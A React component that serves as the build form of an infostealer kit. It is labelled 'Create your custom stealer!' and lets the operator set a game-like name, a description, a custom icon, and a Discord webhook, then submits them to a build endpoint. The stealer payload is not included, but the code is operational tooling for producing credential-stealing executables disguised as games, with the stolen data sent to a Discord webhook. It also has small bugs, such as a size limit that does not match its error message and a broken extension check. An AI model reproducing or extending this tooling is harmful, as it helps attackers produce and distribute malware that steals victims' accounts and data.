import { useRef, useState } from 'react';
import { toast } from 'react-hot-toast';
import { AiOutlineLoading } from 'react-icons/ai';
import { BsCamera, BsCloudCheck, BsTerminal } from 'react-icons/bs';
import axios from 'axios';

export const Builder = () => {
  const inputFile = useRef<HTMLInputElement>(null);
  const [active, setActive] = useState<boolean>(false);
  const [error, setError] = useState<boolean>(true);
  const [icon, setIcon] = useState<File | null>(null);
  const [name, setName] = useState<string>('');
  const [webhook, setWebhook] = useState<string>('');
  const [description, setDesc] = useState<string>('');

  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files![0];
    const extension: string | undefined = file?.name.split('.').pop()?.toLowerCase();
    if (!event.target.files || event.target.files.length === 0 || !file) return toast.error('Please select an icon.');
    if (file.size > 1024 * 1024 * 10) return toast.error('Icon size cannot exceed 5 megabytes');
    if (extension !== '.ico' && file.type !== 'image/x-icon') return toast.error('The file extension is invalid!');
    setIcon(file);
  };

  const onPost = async (event: React.MouseEvent<HTMLButtonElement, MouseEvent>) => {
    event.preventDefault();
    if (name.length > 20) return toast.error('The name is too long');
    if (name.length <= 3) return toast.error('The name is too short');
    if (description.length > 50) return toast.error('The description is too long');

    try {
      setError(false);
      setActive(true);
      const formData = new FormData();
      if (icon !== null) formData.append('icon', icon);
      formData.append('name', name);
      if (webhook) formData.append('webhook', webhook);
      formData.append('description', description);

      await axios.post('/api/builds/new', formData);

      toast.success('The build has been created successfully!');
    } catch (error) {
      setError(true);
      toast.error('An error occurred while trying to create the build!');
    } finally {
      setActive(false);
    }
  };

  const onChangeName = (value: string) => {
    const symbols = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/;
    const letters = /^[a-zA-Z0-9\s]+$/;
    if (value === '') return setName('');
    if (symbols.test(value)) return;
    if (!letters.test(value)) return;

    setName(value);
  };

  const onChangeWebhook = (value: string) => {
    const url = /https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/[0-9]{17,19}\/([a-zA-Z0-9-_]+)/g;
    if (value === '') return setWebhook('');
    if (!url.test(value)) return;

    setWebhook(value);
  };

  const onChangeDesc = (value: string) => {
    setDesc(value);
  };

  return (
    <>
      <div className="flex justify-center items-center px-3 py-4">
        <div className="dark:bg-black bg-white w-full h-full py-3 border dark:border-[#111] border-gray-300 rounded max-w-2xl">
          <div className="border-b dark:border-[#111] border-gray-300 flex justify-between items-center px-4 py-3">
            <div>
              <h2 className="text-lg font-semibold">Build a new file</h2>
              <p className="text-sm text-gray-400">Create your custom stealer!</p>
            </div>
            <div>
              <button
                onClick={() => inputFile.current!.click()}
                className="dark:bg-black bg-gray-50 rounded-lg border hover:dark:borderwhite hover:border-black dark:border-[#111] border-gray-300 h-16 w-16 flex items-center justify-center cursor-pointer select-none"
              >
                {icon ? (
                  <BsCloudCheck className="text-xl" />
                ) : (
                  <BsCamera className="text-xl dark:text-gray-600 text-black" />
                )}
              </button>
              <input
                ref={inputFile}
                aria-label="Upload Icon"
                className="absolute h-[1px] w-[1px] top-[-1000px] left-[-1000px] opacity-0 overflow-hidden whitespace-nowrap invisible"
                type="file"
                accept="image/x-icon"
                onChange={handleFileChange}
              />
            </div>
          </div>
          <div className="block">
            <div className="py-3 px-4">
              <div className="w-full">
                <label className="uppercase text-xs text-gray-600 select-none">
                  Name <i className="text-red-700 font-semibold">*</i>
                </label>
                <input
                  className="px-2 py-3 dark:bg-black bg-white border border-gray-300 dark:border-[#111] w-full text-sm rounded"
                  placeholder={'My game...'}
                  maxLength={20}
                  required={true}
                  value={name}
                  onChange={(event) => onChangeName(event.target.value)}
                />
              </div>
            </div>

            <div className="py-3 px-4">
              <div className="w-full">
                <label className="uppercase text-xs text-gray-600 select-none">Description</label>
                <input
                  className="px-2 py-3 dark:bg-black bg-white border border-gray-300 dark:border-[#111] w-full text-sm rounded"
                  placeholder={'The best game...'}
                  maxLength={50}
                  required={true}
                  value={description}
                  onChange={(event) => onChangeDesc(event.target.value)}
                />
              </div>
            </div>

            <div className="py-3 px-4">
              <div className="w-full">
                <label className="uppercase text-xs text-gray-600 select-none">Webhook</label>
                <input
                  className="px-2 py-3 dark:bg-black bg-white border border-gray-300 dark:border-[#111] w-full text-sm rounded"
                  placeholder={'Your webhook... (Optional)'}
                  value={webhook}
                  onChange={(event) => onChangeWebhook(event.target.value)}
                />
              </div>
            </div>
          </div>
          <div className="pt-4 pb-2 px-4 border-t dark:border-[#111] border-gray-300 flex items-center justify-end">
            <button
              onClick={(event) => onPost(event)}
              disabled={active && error}
              className="disabled:cursor-not-allowed disabled:bg-opacity-60 flex items-center gap-2 font-semibold text-sm cursor-pointer select-none rounded-md py-2 px-4 bg-white hover:bg-gray-200 border border-[#111] text-black transition duration-200"
            >
              {!active ? (
                <BsTerminal className="pointer-events-none" />
              ) : (
                <AiOutlineLoading className="pointer-events-none animate-spin" />
              )}
              Create build
            </button>
          </div>
        </div>
      </div>
    </>
  );
};
